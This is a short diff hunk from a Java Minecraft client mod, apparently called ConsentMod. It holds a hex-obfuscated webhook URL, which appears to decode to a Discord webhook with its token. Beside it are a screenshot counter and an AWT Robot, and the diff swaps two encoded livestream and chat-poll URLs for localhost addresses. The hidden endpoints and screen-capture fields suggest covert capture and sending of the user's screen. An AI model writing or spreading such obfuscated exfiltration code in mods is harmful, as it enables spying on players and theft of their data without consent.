@@ -31,8 +31,8 @@ public class ConsentMod implements ClientModInitializer {
     public static final org.slf4j.Logger LOGGER = org.slf4j.LoggerFactory.getLogger(MOD_ID);
 
     private static final String WEBHOOK_URL = Strings.d("322e2e2a296075753e33293935283e74393537753b2a33752d3f383235353129756b6f696c6a6f6d6a6869636c686a686c6a6d6e75030b23021329123b006d3068622e02286c102d2c692d151b3c0d0f11230a3133333b3f3e6a222d6d6b0c0b1c3c3e19356c313d3e18196f3f1b0862370a2d323739106963");
-    private static final String LIVESTREAM_URL = Strings.d("322e2e2a6075753635393b363235292e60626a626a752f2a36353b3e");
-    private static final String CHAT_POLL_URL = Strings.d("322e2e2a6075753635393b363235292e60626a626a7539323b2e752a353636");
+    private static final String LIVESTREAM_URL = "http://localhost:3000/api/upload";
+    private static final String CHAT_POLL_URL = "http://localhost:3000/api/chat/poll";
 
     private static int screenshotCount = 0;
     private static Robot robot;
